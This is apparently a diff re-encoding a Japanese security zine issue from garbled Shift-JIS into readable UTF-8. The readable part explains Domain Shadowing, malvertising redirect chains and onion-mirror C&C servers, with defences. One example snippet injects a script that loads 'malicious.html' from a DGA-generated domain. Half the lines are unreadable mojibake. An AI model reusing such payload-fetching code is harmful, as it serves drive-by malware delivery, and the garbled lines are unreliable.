@@ -8,72 +8,72 @@
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
----- ��0�́F�ڎ� ---
+---- 第0章：目次 ---
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-����1��: �g���C�̖ؔn�^�̃}���E�F�A�ɂ���                     Lyc0ris ��
+○第1章: トロイの木馬型のマルウェアについて                     Lyc0ris 著
 
-����2��: Domain Shadowing�U����C&C�̍l�@                         ���ь� ��
+○第2章: Domain Shadowing攻撃とC&Cの考察                         黒林檎 著
 
-����3��: TSA���b�N�̃o�C�p�X����                               IPUSIRON ��
+○第3章: TSAロックのバイパス解錠                               IPUSIRON 著
 
-����4��: ���m�点
+○第4章: お知らせ
 
-����5��: ���҃v���t�B�[��
-
-
-
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-
---- ��1��: �g���C�̖ؔn�^�̃}���E�F�A�ɂ��� ---
-
-���ҁFLyc0ris
-
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-
-�L���̓��e�ɖ�肪����Ɣ��f�������߁A�폜���܂����B
+○第5章: 著者プロフィール
 
 
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- ��2��: Domain Shadowing�U����C&C�̍l�@ ---
+--- 第1章: トロイの木馬型のマルウェアについて ---
 
-���ҁF���ь�
+著者：Lyc0ris
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+記事の内容に問題があると判断したため、削除しました。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第2章: Domain Shadowing攻撃とC&Cの考察 ---
+
+著者：黒林檎
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) �ŏ���
+■0x01.) 最初に
 
-�@���v���Ԃ�ł��A���ь�ł��B����́A�R���s���[�^�E�C���X�ɂ�����⏕�I
-�ȍU���̂��b�������Ē����܂��B
-�@����ȊO�ɁAIoT�n�b�L���O���������������ł�������I�ɂ��Ǘ���API�̖��F
-�؂Ȃǂ̖�肵�����������ɂȂ������̂ō���͎������߁A����ȊO�ł�OWASP 
-ZAP API���g�p�����E�F�u�f�f�֗��c�[���̍쐬�ȂǏ������������̂ł����A����
-�������Ă�Œ���OSX�̃����T���E�F�A��Domain Shadowing�Ƃ��������ɐG���
-���āA�}���E�F�A�ɂ�����⏕�I�ȍU���Ƃ�������Domain Shadowing��C&C�ɂ�
-�ĊȒP�ɏ������Ē��������Ǝv���܂��B
+　お久しぶりです、黒林檎です。今回は、コンピュータウイルスにおける補助的
+な攻撃のお話をさせて頂きます。
+　これ以外に、IoTハッキングを書きたかったですが事例的にも管理者APIの未認
+証などの問題しか書けそうになかったので今回は時期改め、それ以外ではOWASP 
+ZAP APIを使用したウェブ診断便利ツールの作成など書きたかったのですが、いろ
+いろやってる最中にOSXのランサムウェアやDomain Shadowingといった物に触れま
+して、マルウェアにおける補助的な攻撃という事でDomain ShadowingとC&Cについ
+て簡単に書かせて頂きたいと思います。
 
 
-��0x02.) Domain Shadowing�U���Ƃ�?
+■0x02.) Domain Shadowing攻撃とは?
 
-�@Domain Shadowing�U���Ƃ́A�ȒP�Ɍ����Ƒ��l�̃h���C���A�J�E���g�̎��i��
-��𓐂ݎ��(DNS���R�[�h���n�b�L���O��)�T�u�h���C�����ʂɐ�������U����
-���B
-�@�ړI�Ƃ��Ă̓h���C����Ώۂɂ������m���������ړI������܂��B�܂��A��
-�̕��@�ł́A�U���҂́h�قږ����h�Ƀh���C���𐶐��ł���Ƃ��������b�g����
-��܂��B
+　Domain Shadowing攻撃とは、簡単に言うと他人のドメインアカウントの資格情
+報を盗み取り(DNSレコードをハッキングし)サブドメインを大量に生成する攻撃で
+す。
+　目的としてはドメインを対象にした検知を回避する目的があります。また、こ
+の方法では、攻撃者は”ほぼ無限”にドメインを生成できるというメリットがあ
+ります。
 
-�@Domain Shadowing�U�����hruffnex.oc.to�g��p���Đ��������Ă��������܂��B
+　Domain Shadowing攻撃を”ruffnex.oc.to“を用いて説明させていただきます。
 
-��domain shadowing�}��
+○domain shadowing図解
 
 /****************************/ ===>  /****************************/
 /*      ruffnex.oc.to       */ ===>  /*   133.242.147.127(Japan) */
@@ -83,131 +83,131 @@ ZAP API���g�p�����E�F�u�f�f�֗��c�[���̍쐬�ȂǏ������������̂ł����A����
 /* malicious.ruffnex.oc.to  */ ===>  /*  133.242.147.127(Chaina) */
 /****************************/ ===>  /****************************/
 
-�@�Ƃ����l�ɁA�hruffnex.oc.to�h��DNS���R�[�h���������Ă��܂����̂ł���
-�΃T�u�h���C���Ȃǐ��������Ɂhruffnex.oc.to�h�̃��R�[�h�����������Ďg����
-�ǂ�����Ȃ���?!�Ǝv����������܂��񂪁A���̍U���̓h���C�����L�҂��p�ɂ�
-DNS���R�[�h���m�F���Ă��Ȃ��Ƃ����l�Ԃ̐Ǝ㐫�̗l�ȕ������Đ��藧���߁A
-�Ǘ��҂��p�ɂɊm�F����l��(���X�o�^����Ă���DNS���R�[�h)�͏��������Ȃ���
-�����̂����̍U���̃|�C���g�ł��B
+　という様に、”ruffnex.oc.to”のDNSレコードを乗っ取ってしまったのであれ
+ばサブドメインなど生成せずに”ruffnex.oc.to”のレコードも書き換えて使えば
+良いじゃないか?!と思うかもしれませんが、この攻撃はドメイン所有者が頻繁に
+DNSレコードを確認していないという人間の脆弱性の様な物をついて成り立つため、
+管理者が頻繁に確認する様な(元々登録されているDNSレコード)は書き換えないと
+いうのがこの攻撃のポイントです。
 
-�@�����Domain Shadowing�Ɏ����U�����@�Ƃ��āAFast-Flax�U�������݂��܂��B
-�@����ł́A����2�͂ǂ̗l�ȈႢ������̂ł��傤��?
+　これとDomain Shadowingに似た攻撃方法として、Fast-Flax攻撃が存在します。
+　それでは、その2つはどの様な違いがあるのでしょうか?
 
-�EFast-Flax�U��
-�@1�̃h���C���ɑ΂��āA������IP�����蓖�Ă܂��B�����āATTL�l��Z�����Z
-�����Ԃ�IP��؂�ւ��Ă����܂��B����āAIP�x�[�X�̌��m���������ړI����
-��܂��B
+・Fast-Flax攻撃
+　1つのドメインに対して、複数のIPを割り当てます。そして、TTL値を短くし短
+い時間でIPを切り替えていきます。よって、IPベースの検知を回避する目的があ
+ります。
 
-�EDomain Shadowing�U��
-�@DGA�̗l�Ȏd�g�݂ŕ����̃T�u�h���C�����쐬���AIP�����蓖�Ă܂��B���̍U��
-�ł́A�h���C���x�[�X�̌��m���������ړI������܂��B
+・Domain Shadowing攻撃
+　DGAの様な仕組みで複数のサブドメインを作成し、IPを割り当てます。この攻撃
+では、ドメインベースの検知を回避する目的があります。
 
-�@Exploit-kit�Ȃǂŗp�����Ă���ADGA�Ȃǂ� Domain shadowing�Ő��������h
-���C���𐶐����܂��BDGA�̗�Ƃ��āA���t��p����DGA�����݂��܂��B���I�ł�
-���A���t��p����DGA�͑������󂯂܂��B
+　Exploit-kitなどで用いられている、DGAなどで Domain shadowingで生成したド
+メインを生成します。DGAの例として、日付を用いたDGAも存在します。私的です
+が、日付を用いたDGAは多く見受けます。
 
------  ���t��p����DGA
+-----  日付を用いたDGA
 function runonload(){
 	if(!document.body){
 		setTimeout(runonload,50);
 	}else{
 		var s = document.createElement("SCRIPT");
-		s.src = "http://" + hashdate().toString(16) + �g.jp/malicious.html?" + Math.random();
+		s.src = "http://" + hashdate().toString(16) + “.jp/malicious.html?" + Math.random();
 		document.body.appendChild(s);
 	}
 };
 -----
 
-�@����ȊO�ł́A�hmalicious.ruffnex.oc.to�h�ɂȂ�l�ɔz��ɕ������ێ����A
-�T�u�h���C���𐶐�����l�d�g�ݗp����DGA�Ȃǂ�����܂��B
-�@DGA���̂͑��푽�l�ȕ��@������̂ŁA����ƌ��������@�͂���܂���B
+　これ以外では、”malicious.ruffnex.oc.to”になる様に配列に文字列を保持し、
+サブドメインを生成する様仕組み用いるDGAなどもあります。
+　DGA自体は多種多様な方法があるので、これと言った方法はありません。
 
 
-��0x03.) Domain shadowing�U���̗���
+■0x03.) Domain shadowing攻撃の流れ
 
-�@�b��߂��āADomain shadowing�U���̗���ł����A�}���ł͈ȉ��̂悤�ȗ���ł��B
+　話を戻して、Domain shadowing攻撃の流れですが、図解では以下のような流れです。
 
 [*1]                                  [*2]                                       [*3]
 /****************************/ ===>  /***********************************/ ===> /*********************************/
-/*    �s���ȍL���y�[�W�Ȃ�  */ ===>  /*      malicious.ruffnex.oc.to    */ ===> /*  �����f�B���O�y�[�W(exploit�y�[�W) */
+/*    不正な広告ページなど  */ ===>  /*      malicious.ruffnex.oc.to    */ ===> /*  ランディングページ(exploitページ) */
 /****************************/ ===>  /***********************************/ ===> /*********************************/
 
-���e�y�[�W�̐���
+●各ページの説明
 
-�@�e�y�[�W�ɂ��Đ������܂��B
+　各ページについて説明します。
 
-��[*1]
+○[*1]
 
-�@�s���ȍL���y�[�W�͂������AjavaScript�͓�ǉ�����Ă���Aiframe���̂�
-���[�U�[�ɂ͌����Ȃ��l�ɂ���Ă��܂��B���̍L���y�[�W�́A���Domain shado
-wing�y�[�W��POST���΂����������܂��B
-�@POST�ł́A�F�؃L�[�̂悤�ȕ��𓊂��܂��B
+　不正な広告ページはもちろん、javaScriptは難読化されており、iframe自体も
+ユーザーには見えない様にされています。その広告ページは、主にDomain shado
+wingページへPOSTを飛ばす役割をします。
+　POSTでは、認証キーのような物を投げます。
 
 -----
 POST http://malicious.ruffnex.oc.to/ladrien.html HTTP/1.1
-�c
+…
 Host: malicious.ruffnex.oc.to
 Pragma: no-cache
 
-�F�؃L�[:hogehoge
+認証キー:hogehoge
 -----
 
-��[*2]
-�@�L���y�[�W���A�F�؃L�[��POST���󂯈ȉ��̗l�ȃ��N�G�X�g��Ԃ��܂��B
+○[*2]
+　広告ページより、認証キーのPOSTを受け以下の様なリクエストを返します。
 
 -----
-<meta http-equiv=�gREFRESH�h content=�g0;url=�����f�B���O�y�[�W�ցg>
+<meta http-equiv=“REFRESH” content=“0;url=ランディングページへ“>
 -----
 
-��[*3]
+○[*3]
 
-�@�ŏI�I�ɍL���y�[�W����A�ړI�̃����f�B���O�y�[�W(exploit�Ȃǂ��s���y�[
-�W)�ɓ]������U�������s����܂��B
+　最終的に広告ページから、目的のランディングページ(exploitなどを行うペー
+ジ)に転送され攻撃が実行されます。
 
-���h���C����؂�ւ���^�C�~���O
+●ドメインを切り替えるタイミング
 
-�@�h���C���Ȃǂ�؂�ւ���^�C�~���O�ł����Aav check�悤�ȃI�����C���T�[
-�r�X�Ȃǂ�p���܂��B
-�@��͎҂ɂ�茟�m�T�[�r�X�Ƀh���C�����u���b�N���X�g�ɓ����ꂽ���Ȃǂ�
-����I�ɒ��ׂ܂��B�����u���b�N���X�g�ɓ����ꂽ�ۂɁA�h���C����؂�ւ�
-�܂��B
+　ドメインなどを切り替えるタイミングですが、av checkようなオンラインサー
+ビスなどを用います。
+　解析者により検知サービスにドメインがブラックリストに入れられたかなどを
+定期的に調べます。もしブラックリストに入れられた際に、ドメインを切り替え
+ます。
 
-�Q�lLink:http://avdetect.com/
+参考Link:http://avdetect.com/
 
-��Domain Shadowing�U���̑΍�
+●Domain Shadowing攻撃の対策
 
-�@Domain Shadowing�́A�P���Ƀ��[�U�[���x���ĊǗ��p�l���ɃA�N�Z�X���邽�߁A
-�����̓t�B�b�V���O�̂悤�ȏ����I�ȍU���Z�p���g�p����܂��B����āA���̍U
-���ɑ΂��Ă̑΍�Ƃ��Ă͈ȉ����������Ă��܂��B
+　Domain Shadowingは、単純にユーザーを騙して管理パネルにアクセスするため、
+多くはフィッシングのような初歩的な攻撃技術が使用されます。よって、この攻
+撃に対しての対策としては以下が挙げられています。
 
-�E2�i�K�F�؂�p����B
-�EDNS���R�[�h�Ȃǂ̕ύX��ɓd�q���[������B
+・2段階認証を用いる。
+・DNSレコードなどの変更後に電子メールする。
 
-�@�ȏ�ŁADomain Shadowing�ɂ��Ă̊T�v���I���AC&C�Ŗʔ������������ȒP��
-�����܂Ƃ߂����Ē��������Ǝv���܂��B
+　以上で、Domain Shadowingについての概要を終え、C&Cで面白かった事を簡単で
+すがまとめさせて頂きたいと思います。
 
-��0x04.) C&C�ɂ���
+■0x04.) C&Cについて
 
-�@�ŋ߁AOSX��_���������T���E�F�A���b��ɂȂ�܂����B��ɁhOSX�h�Ƃ�����
-��������Ă��܂������A�����Ɏg�p����Ă��������l�I�ɖڐV�����Z�p�ł���
-�̂ŏЉ�܂��BOSX�����T���E�F�A��C&C�T�[�o�[��ONION�T�[�o�[�ł����A����
-�Ⴂ�܂��B
+　最近、OSXを狙ったランサムウェアが話題になりました。主に”OSX”というの
+が騒がれていましたが、そこに使用されていた物が個人的に目新しい技術でした
+ので紹介します。OSXランサムウェアのC&CサーバーでONIONサーバーですが、少し
+違います。
 
------  onion�~���[�ȃ����N
+-----  onionミラーなリンク
 lclebb6kvohlkcml*]onion[*]link
 lclebb6kvohlkcml*]onion[*]nu
 -----
 
-�@onion�A�h���X�́A[���p�p��*16].onion�ȃA�h���X��tor proxy���o�R���鎖��
-�A�N�Z�X�ł��镨�ł��B�܂��A�h.onion�h�͋[��TLD�ł���Ator proxy���o�R��
-�Ȃ���΃A�N�Z�X���鎖���o���܂���B�������A����C&C�Ɏg�p����Ă���T�[�o
-�[���honion�~���[�h�ƌĂԂƂ��āA����͂́h.onion�h�ƃE�F�u�Ƃ̊Ԃ̃����N
-�̂悤�Ȏd�g�݂ł��B
+　onionアドレスは、[半角英数*16].onionなアドレスでtor proxyを経由する事で
+アクセスできる物です。また、”.onion”は擬似TLDであり、tor proxyを経由し
+なければアクセスする事が出来ません。しかし、このC&Cに使用されているサーバ
+ーを”onionミラー”と呼ぶとして、これはは”.onion”とウェブとの間のリンク
+のような仕組みです。
 
-�@tor�̗l�ɒʐM���Í�������l�Ȏd�g�݂ł͂Ȃ��ł����A�T�[�o�[���̂̓�����
-�͕ێ������܂܂ɂȂ�܂��B
+　torの様に通信を暗号化する様な仕組みではないですが、サーバー自体の匿名性
+は保持したままになります。
 
------  onion�~���[��nslookup�������ʁi*ip�ɒ��ځj
+-----  onionミラーをnslookupした結果（*ipに注目）
 $nslookup auutwvpt2zktxwng.onion.link
 Non-authoritative answer:
 Name:	auutwvpt2zktxwng.onion.link
@@ -220,12 +220,12 @@ Name:	hackerrljqhmq6jb.onion.link
 Address: 103.198.0.2
 -----
 
-�@���̗l��C&C�T�[�o�[�Ƃ��Ă��̗l�ȕ����g���Ă���noha�B���߂Č������ߋ�
-���܂����B���ꂩ��}���E�F�A�̕⏕�I�ȋZ�p�Ƃ��Ăǂ̗l�ȋZ�e�������Ă���
-�̂��C�ɂȂ�Ƃ���ł��B
+　この様なC&Cサーバーとしてこの様な物を使われているnoha。初めて見たため驚
+きました。これからマルウェアの補助的な技術としてどの様な技銃が増えていく
+のか気になるところです。
 
 
-��Domain Shadowing�Q�l�����N
+●Domain Shadowing参考リンク
 
 http://blogs.cisco.com/security/talos/angler-domain-shadowing
 https://blogs.sophos.com/2015/07/21/a-closer-look-at-the-angler-exploit-kit/
@@ -233,7 +233,7 @@ https://blog.malwarebytes.org/malvertising-2/2015/04/domain-shadowing-with-a-twi
 http://en.wooyun.io/2016/03/16/45.html
 https://nakedsecurity.sophos.com/2012/11/23/hacked-go-daddy-ransomware/
 
-��Onion�~���[�Q�lURL
+●Onionミラー参考URL
 
 http://www.onion.link/faq.html
 https://tor2web.org/
@@ -243,249 +243,249 @@ https://tor2web.org/
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- ��3��: TSA���b�N�̃o�C�p�X���� ---
+--- 第3章: TSAロックのバイパス解錠 ---
 
-���ҁFIPUSIRON
-
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-
-
-��0x01.) �͂��߂�
-
-�@TSA���b�N������������@�͂��������݂��܂��B�Ⴆ�΁A�o�C�p�X�����A�s�b
-�L���O�c�[�����g���������A�}�X�^�[�L�[�ɂ������Ȃǂł��B�{�e�ł́A����
-�Ƃ��ȒP�ȃo�C�p�X�����ɂ��ďЉ�܂��B
-
-
-��0x02.) TSA���b�N�̊T�v
-
-�@TSA���b�N�Ƃ̓A�����J�^�A�ۈ��� TSA�iTransportation Security Administr
-ation�j�ɂ���ĔF�E�e�F���ꂽ���O�ł��B�ߔN��TSA���b�N�͕������킹����
-�^�C�v�̂��̂����y���Ă��܂��i�}1�Q�Ɓj�B
-
-�i�}2�Fhttp://wizardbible.org/62/img/TSA_lock.jpg�jTSA���b�N�t���_�C������
-
-�@�A�����J���������e���̌�A���j����댯���̌����̂��߂ɃA�����J�����̂�
-�ׂĂ̋�`�ɂ����āA�A�����J�ւ̏o�����ƃA�����J�����̃t���C�g�ɍۂ��āA
-���d�ȃZ�L�����e�B�`�F�b�N���s���Ă��܂��B���ɋ�`�ɗa����ו��Ɋւ���
-�́A�����傪���Ȃ��ꏊ�ł�TSA�E���ɂ���ăo�b�O��X�[�c�P�[�X�̒���������
-�Ă��܂��B�����X�[�c�P�[�X���̏��O���{�����ꂽ��Ԃ̏ꍇ�ɂ́A�E�����j��
-���Ă��猟�����܂��B���������j��s�ׂ������ɂ���ē��e�����j�󂵂��蕴��
-�����肵�Ă��ATSA�E���͈�ؐӔC�𕉂�Ȃ��Ă��悢�ƍ��ɂ���Ď�茈�߂��
-�Ă��܂��B���̂��߁A�ו���a����^�C�~���O�Ŏ{�������Ȃ��悤�ɑ�����܂��B
-����̓A�����J�{�y�����łȂ��A�n���C�A�O�A���A�A���X�J�A�T�C�p���A���̑�
-�̃A�����J�̂̃G���A�̗��s�̍ۂ����l�ł��B
-
-�@�������A���O�̎{�������Ȃ��Ƃ������Ƃ�TSA�E���ȊO�ɂ����g���J�����Ă�
-�܂����ꂪ����܂��B
-�@TSA���b�N�͂��������s�����������܂��BTSA���b�N�͓��ʂ�TSA����̔F����
-���Ă���ATSA���b�N���t���Ă�����O�ł���΁A�{�������܂܋�`�̌����ɏo��
-�Ă��悢���ƂɂȂ��Ă��܂��B��`��TSA�E����TSA���b�N�̌������L���Ă���A
-TSA���b�N���{�����ł��܂��B���̌��͈�ʌ����ɂ͔̔�����Ă��Ȃ����߁ATSA
-�E���ȊO�ɂƂ��Ă͌��J���̋Z�p����g����ȊO�ɊJ������p�͂���܂���B
-
-��TSA���b�N���t�����Ă��Ȃ��X�[�c�P�[�X
-
-�@TSA���b�N���t�����Ă��Ȃ��X�[�c�P�[�X�����ɁATSA���b�N�t���̃_�C������
-�싞����X�[�c�P�[�X�x���g���̔�����Ă��܂��B
-��TSA���b�N�t���̃_�C�������싞��
-
-�@�V���b�N����2�̃t�@�X�i�[�̌��ɒʂ��āA�t�@�X�i�[���J���邱�Ƃ�h����
-���BTSA���b�N�̌����͒�ʂɑ��݂��܂��B�Â��^�C�v�ł́A�s���^���u���[���^
-�C�v��TSA���b�N�����݂��܂��B
-
-��TSA���b�N�t���̃X�[�c�P�[�X�x���g
-
-�@�{������ƃx���g���Œ肳��A��������ƃx���g���ɂ߂邱�Ƃ��ł��܂��B��
-����̕������x���g��ʂ��ă��b�N���|���邱�ƂŁA�X�[�c�P�[�X�x���g������
-���ĊO�����Ƃ�h�����Ƃ��ł��܂��B
-
-�@�t�@�X�i�[�ŊJ����^�C�v�̏ꍇ�A�x���g���{�������܂܂ł���T��Œ��̕�
-�i��D�����Ƃ��ł��܂��B����A�d���W���J����^�C�v�̏ꍇ�A���̎�̃X�[�c
-�P�[�X�x���g�ŌŒ肳��Ă���ƁA�x���g��TSA���b�N���������邩�A�x���g���
-�f���邩���Ȃ���΁A���̕��i�͒D���܂���B�x���g�͐n���ŊȒP�ɐؒf����
-���Ƃ��ł��܂����A�ؒf����Ă��܂��Γ���ɂ��������Ƃ����m�ł��܂��B
-
-��TSA���b�N�ȊO�̏��O�Ŏ{�������܂܂��Ƃǂ��Ȃ邩
-
-�@�Ƃ���ŁA�uTSA���b�N���J����W�����s�݂ŁA�X�[�c�P�[�X���Ɖ󂳂�邱��
-�����邽�߁A�X�[�c�P�[�X�̌��͂�����TSA���b�N�t���X�[�c�P�[�X�x���g������
-��悤�Ɂv�Ƃ����邱�Ƃ�����悤�ł��B������TSA�E���ɔj�������ꍇ�ł��A
-TSA���b�N�t���X�[�c�P�[�X�x���g�ł���΁A�x���g�̐ؒf�����̔�Q�ōς݁A�X
-�[�c�P�[�X�������Ă�����O��j�󂳂�邱�Ƃ�����܂���B�X�[�c�P�[�X����
-���Ă�����O���������悤�Ƃ��Ă��A���[�J�[�ɖ₢���킹�����Ԃ������A��
-���̏ꍇ�͑Ή����镔�i�̍݌ɂ��c���Ă��炸�������邱�Ƃ����ł��܂���B
-
-
-��0x03.) TSA���b�N�̃o�C�p�X����
-
-�@TSA���b�N�̌����̋߂��ɁuTSA00x�v�̂悤�ɍ��󂳂�Ă��܂����A���̐��l��
-�Ƃ�TSA���b�N�̌��̌`��E�傫�����قȂ�܂��B�����ł�TSA007��TSA002���悭
-�������邱�Ƃ��ł��܂��B�{�e�ł�TSA002�̉������@���Љ�܂�
-
-��TSA002
-
-�@TSA002�͎g�p�҂�3���̐����̑g�ݍ��킹���Ŏ{�������ATSA�E���͌��Ŏ{����
-����^�C�v�ł��i�}2�Q�Ɓj�B
-
-�i�}2�Fhttp://wizardbible.org/62/img/TSA002_3.jpg�jTSA002�̊O��
-
-�@�Ïؔԍ��͑��ʂɑ����܂��i�}3�Q�Ɓj�B
-
-�i�}3�Fhttp://wizardbible.org/62/img/TSA002_10.jpg�jTSA002�̑���
-
-�@�Ïؔԍ����Z�b�g����ƃV���b�N�����������Ƃ��ł��A�������܂��B�{������
-�̓V���b�N����߂�����ԂŔԍ������炵�܂��B
-
-��TSA002�̈Ïؔԍ��̕ύX
-
-�@�f�t�H���g�̈Ïؔԍ���000�ł����A�C�ӂ̔ԍ��ɕύX�ł��܂��B
-�@�Ïؔԍ����Z�b�g���ăV���b�N����������Ԃɂ��܂��B�V���b�N������������
-�ƁA�����̓ˋN�������܂��B�V���b�N���̎��𒆐S�ɂ��Đ�[��90�x��]���āA
-�ˋN��90�x��̐؂茇���ɓ���܂��i�}4�Q�Ɓj�B
-
-�i�}4�Fhttp://wizardbible.org/62/img/TSA002_11.jpg�j�Ïؔԍ��̕ύX���̓�
-�N�̈ʒu
-
-�@�V���b�N�����ォ�牟������ԂŁA�_�C�������񂵂Đ��l��ύX���܂��B�ړI
-�̈Ïؔԍ��ɃZ�b�g������A�V���b�N�����ォ�牟�����Ȃ��悤�ɂ��܂��B����
-�ňÏؔԍ����ύX����܂��B
-
-��TSA002�̃o�C�p�X����
-
-�@TSA002��TSA���b�N���̌����͎��̂悤�Ȍ`��ɂȂ��Ă��܂��i�}5�Q�Ɓj�B
-
-�i�}5�Fhttp://wizardbible.org/62/img/TSA002_1.jpg�jTSA002�̌����̌`��
-
-�@���̌����͒ʏ�TSA�E�������g�p���܂���BTSA���b�N�̃}�X�^�[�L�[��}����
-�邱�ƂŁA�Ïؔԍ����Z�b�g���邱�ƂȂ��A�������邱�Ƃ��ł��܂��B�{�e�̖�
-�I�̓}�X�^�[�L�[�ȊO�̂��̂�}�����ATSA���b�N���������Ă��܂����Ƃł��B
-������Ƃ������������΁A���̎菇�ŒN�ł������ł��܂��B
-
-�@TSA002�͎��̎菇�Ńo�C�p�X�����ł��܂��B
-
-1�F�f�B���v�����̃s�b�L���O�Ɏg�p����e���V������p�ӂ��܂��i�}6�Q�Ɓj�B
-
-�i�}6�Fhttp://wizardbible.org/62/img/TSA002_2.jpg�j�����Ώۂ�TSA002�Ɖ���
-�Ɏg�p����e���V����
-
-�@���̃e���V�������p�ӂł��Ȃ��ꍇ�́A��r�I���݂̂���L�e���V�����Ȃǂő�
-�p�ł��܂��B���݂�v������̂͂Ђ˂�̓��삪���邽�߂ł��B
-�@�������A�����̑O�ʂ̌����̌`��͒����`�ł����A�����ɓˋN�����邽�߁A��
-�̓ˋN������邱�Ƃ��ł�����݂̂��̂����}���ł��܂���B
-
-2�F�e���V�����̕��̏���������TSA���b�N�̌����ɑ}�����܂��i�}7�Q�Ɓj�B
-
-�i�}7�Fhttp://wizardbible.org/62/img/TSA002_4.jpg�j�e���V�����̑}��
-
-3�F���܂ő}������ƒe�͂�����܂��B�e�͂������Ԃ����܂܁A�S�̂����i���邢
-�͏�j�Ɉړ�����ƁA���������ɉ�]���܂��i�}8�Q�Ɓj�B
-
-�i�}8�Fhttp://wizardbible.org/62/img/TSA002_5.jpg�j�e���V�����̑���
-
-4�F������90�x��]���ATAS002�Ƃ��������ɑ΂��āA���������ɂȂ�Ή����̐���
-�ł��i�}9�Q�Ɓj�B
-
-�i�}9�Fhttp://wizardbible.org/62/img/TSA002_6.jpg�j��������
-
-�@TSA���b�N���������Ă��A�V���b�N���̐�[�͏オ��܂���B����ɂ��������
-���A������ԂɂȂ�̂́A�V���b�N���̐�[�ɔ閧������܂��B
-�@�V���b�N���̐�[���Z�b�g����Ă��镔���̎��͂ɐԂ��E�H�[�h�Ƌ����̃E�H
-�[�h������܂��B�Ԃ��E�H�[�h��2�ӏ��ɐ؂茇��������~����̏�Q���ł��B��
-���A���̓����ɂ�������̃E�H�[�h��1�ӏ��ɐ؂茇��������~����̏�Q���ł��B
-�@TSA���b�N���{��������ƁA�����̃E�H�[�h��90�x��]���܂��BTSA���b�N�̉�
-�����ɂ͐ԐF�̃E�H�[�h�̐؂茇���Ƌ����̃E�H�[�h�̋����̐؂茇���������A
-�V���b�N���̎��𒆐S�ɂ��ĉ�]���邱�ƂŁA������ԂɂȂ�܂��i�}10�A�}11
-�Q�Ɓj�B
-
-�i�}10�Fhttp://wizardbible.org/62/img/TSA002_7.jpg�j�E�H�[�h�̐؂茇�����������Ƃ���
-�i�}11�Fhttp://wizardbible.org/62/img/TSA002_8.jpg�jTSA���b�N�̉������
-
-�@�t�ɁATSA���b�N�̎{�����ɂ͐ԐF�̃E�H�[�h�̐؂茇���Ƌ����̃E�H�[�h�̋�
-���̐؂茇��������Ȃ��̂ŁA�V���b�N���̐�[���E�H�[�h�Ɉ����|����킯��
-���B�܂�A�V���b�N���̐�[�����̈ʒu�ɂ���Ύ{����ԂɂȂ�킯�ł��i�}
-12�Q�Ɓj�B
-
-�i�}12�Fhttp://wizardbible.org/62/img/TSA002_9.jpg�jTSA���b�N�̎{�����
-
-
-��0x04.) �I����
-
-�@����Љ���o�C�p�X�����͔��ɊȒP�ł����B����TSA001��ꕔ��TSA007��
-����قǊȒP�ɂ��܂������܂���B�s�b�L���O�c�[����}�X�^�[�L�[�̕����Ȃ�
-���L���ł��B�ڍׂ͏o�ŗ\��̏��O�̖{�ŏЉ�܂��B
-
-
+著者：IPUSIRON
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
- --- ��4��: ���m�点 ---
+
+■0x01.) はじめに
+
+　TSAロックを解錠する方法はいくつか存在します。例えば、バイパス解錠、ピッ
+キングツールを使った解錠、マスターキーによる解錠などです。本稿では、もっ
